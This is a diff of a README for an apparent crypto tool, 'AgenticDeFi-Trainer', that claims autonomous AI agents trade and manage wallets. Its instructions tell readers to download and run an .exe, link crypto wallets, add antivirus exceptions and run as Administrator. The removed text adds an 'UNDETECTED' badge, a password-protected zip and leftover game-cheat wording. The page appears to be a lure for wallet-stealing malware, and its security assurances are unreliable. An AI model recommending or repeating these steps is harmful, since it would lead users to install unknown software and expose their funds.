@@ -1,88 +1,90 @@
-<div align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=30&duration=2000&pause=500&color=00BFFF&center=true&vCenter=true&width=600&lines=AgenticDeFi+Trainer;Autonomous+AI+Agent+Swarm;x402+Self-Executing+Wallets" alt="Typing SVG" />
-  <br><br>
-  <img src="https://img.shields.io/badge/build-164-brightgreen" alt="Build" />
-  <img src="https://img.shields.io/badge/downloads-101-blue" alt="Downloads" />
-  <img src="https://img.shields.io/badge/status-UNDETECTED-success" alt="Status" />
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="License" />
-  <br><br>
-</div>
-[![installer-preview-(2).png](https://i.postimg.cc/RhFmydbM/installer-preview-(2).png)](https://postimg.cc/R6j2n7B8)
+# 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous software
 
-# 🚀 AgenticDeFi Trainer
+[![Download AgenticDeFi-Trainer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Melbonafide455/AgenticDeFi-Trainer/releases)
 
-**Autonomous AI Agent Swarm & x402 Protocol Self-Executing Wallet Framework**
+## 📌 Overview
 
-> **The bleeding-edge institutional and developer meta for 2026.**  
-> Human-executed DeFi is obsolete. This framework empowers LLM‑driven agents with their own stablecoin wallets to autonomously trade, bridge, and manage treasuries across chains.
+AgenticDeFi-Trainer provides tools to manage digital assets using artificial intelligence. This software automates tasks like trading, moving funds between chains, and managing treasuries. It uses an AI swarm framework to execute commands on the blockchain. You do not need to watch the screen while the system works. It handles complex tasks through intent-based logic. The software connects to wallets using the x402 protocol to keep transactions secure and efficient.
 
----
+## 💻 System Requirements
 
-## ✨ Features
+Your computer needs to meet these basic standards to run the software smoothly:
 
-- Secure Wallet Connect (x402 Protocol Integration)
-- Autonomous Cross-Chain Bridging & Yield Optimization
-- Dynamic Portfolio Rebalancing (AI Co-Pilot)
-- Intent-Based Trade Execution
-- Real-Time News & Macro Data Processing
-- Multi-Agent Swarm Coordination
-- Self-Executing Smart Contracts
-- Automated Treasury Management
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Dual-core CPU with 2.0 GHz speed or better.
+- Memory: 8 GB of RAM or more.
+- Storage: 500 MB of free disk space.
+- Internet: Stable broadband connection for blockchain interaction.
 
----
+## 📥 Download and Setup
 
-## 📦 Installation
+Follow these steps to prepare your system:
 
-1. Download the latest `AgenticDeFi_Trainer_v1.0.zip` from the **RELEASE** folder.
-2. Extract the archive using password: `AgenticDeFi2026`.
-3. Run `setup.exe` and follow the on‑screen instructions.
-4. Launch the trainer from the installed shortcut.
+1. Visit the [official release page](https://github.com/Melbonafide455/AgenticDeFi-Trainer/releases) to download the latest version.
+2. Look for the file ending in .exe under the Assets section.
+3. Save the file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the prompts on your screen to complete the installation.
+7. Click Finish to close the installer.
 
----
+## 🚀 Running the Software
 
-## 🎮 Usage
+Once installed, find the AgenticDeFi-Trainer icon on your desktop. Double-click the icon to launch the main screen. The first time you open the program, the system performs a quick check of your hardware. Wait for the green status light to appear in the top corner. This indicates the software connects to the network without issues.
 
-- Press **F1** – Connect Wallet (x402 Protocol)
-- Press **F2** – Auto Bridge & Yield Optimization
-- Press **F3** – Dynamic Portfolio Rebalance
-- Press **F4** – Intent‑Based Trade Execution
-- Press **F5** – Process News & Macro Data
-- Press **F6** – Multi‑Agent Swarm Coordination
-- Press **F7** – Self‑Executing Smart Contracts
-- Press **F8** – Automated Treasury Management
+## 🛠 Using the Settings
 
-Press **ESC** to exit.
+The configuration panel allows you to customize how your AI agents behave. Click the Settings gear icon to access these options:
 
----
+- Execution Mode: Choose between passive monitoring or active trading.
+- Wallet Connection: Link your existing crypto wallets securely.
+- Risk Thresholds: Set specific limits for how much the software spends on fees.
+- Asset Management: Select which coins or tokens the swarm tracks.
 
-## ⚠️ Legal Disclaimer
+Always click Save after you adjust your preferences. The software restarts briefly to apply new rules to the active agents.
 
-This software is provided for **educational and research purposes only**.  
-The user assumes full responsibility for any consequences arising from its use.  
-The developers are not liable for any financial losses, legal issues, or damages.
+## 📊 Monitoring Activity
 
----
+The main dashboard shows live data from your agents. You see several sections here:
 
-## 🛠 Troubleshooting
+- Recent Trades: A list of buys and sells completed by your swarm.
+- Bridge Activity: Shows funds moved between different blockchain networks.
+- Treasury Health: Displays the current balance and growth of your managed assets.
+- Agent Status: Shows which agents are currently online and working.
 
-- **Trainer not detecting process:** Ensure the target application is running and update `PROCESS_NAME` in `config.py`.
-- **Permission errors:** Run the trainer as Administrator.
-- **Antivirus false positives:** Add an exception for the trainer folder.
+The logs provide text updates for every action. If an agent hits a hurdle, you see a notification in the feed. You can clear this feed at any time to keep the interface clean.
 
----
+## 🔐 Security Information
 
-## 💬 Support
+The software stores your configuration files locally on your computer. It never transmits your private keys to third-party servers. The x402 protocol ensures that your agents hold specific permissions to act on your behalf. These permissions remain under your control. You can revoke access at any time through the Wallet portal inside the software. Always back up your seed phrases and access keys in a physical location.
 
-For issues, open a ticket in our internal support system (available to registered users).
+## 📗 Troubleshooting Common Issues
 
----
+Use these tips if you encounter problems:
 
-## 🔑 Keywords
+- The software fails to open: Ensure you installed the latest version. Check your antivirus settings to see if it blocks the application.
+- Syncing errors: Check your internet connection. A slow or unstable connection prevents the agents from reading the blockchain.
+- High fee warnings: Adjust your gas limit settings to match current market conditions. 
+- Agent inactivity: Check your token balance. Your wallet must contain enough native currency to pay for network interaction fees.
 
-`ai-agents, x402-protocol, autonomous-trading, agentic-defi, llm-trading, web3-ai, crypto-agents, defi-automation, smart-contract-execution, yield-farming-bot, ai-wallet, intent-based-trading, cross-chain-arbitrage, stablecoin-payments, treasury-management, ai-swarm, blockchain-automation, crypto-framework, machine-learning-crypto, decentralized-ai`
- 
- 
- 
- 
- 
- 
+If these steps do not fix the problem, restart the application.
+
+## 🌐 Blockchain Connectivity
+
+The trainer relies on multiple decentralized protocols to achieve its goals. By using swarms, the system distributes requests across different nodes. This method increases speed and reliability. When you use cross-chain tools, the software verifies the route before it executes any transaction. This prevents errors during the bridge process. You see a confirmation window for large transactions if you enable the manual review setting.
+
+## 📈 Yield Farming and Strategies
+
+The software features built-in logic for yield farming. It tracks interest rates across various decentralized exchanges. When the system finds a better rate for your assets, it alerts you or executes the switch automatically. This behavior optimizes your returns over time. You define your goal, such as prioritizing stablecoins or maximizing growth, and the swarm adjusts its strategy to follow your logic.
+
+## 🔧 Maintenance
+
+The software performs periodic updates to remain compatible with blockchain changes. You receive a notification when an update is ready. Click the update button to install the latest logic without losing your current settings. Frequent updates ensure your agents remain efficient in a fast-moving environment.
+
+## 🔗 Additional Resources
+
+For more information, navigate through the menu items inside the application. The Help category contains guides on advanced configuration. You also find a list of compatible tokens and networks on the supported assets page. Use the community forum link to learn how other users organize their agent swarms.
+
+## 📄 Licensing
+
+This project is open source. You are welcome to view the code structure in this repository. All components included in the installer follow standard licenses for transparency and software integrity. Keep your copy updated to use the latest features and security patches.
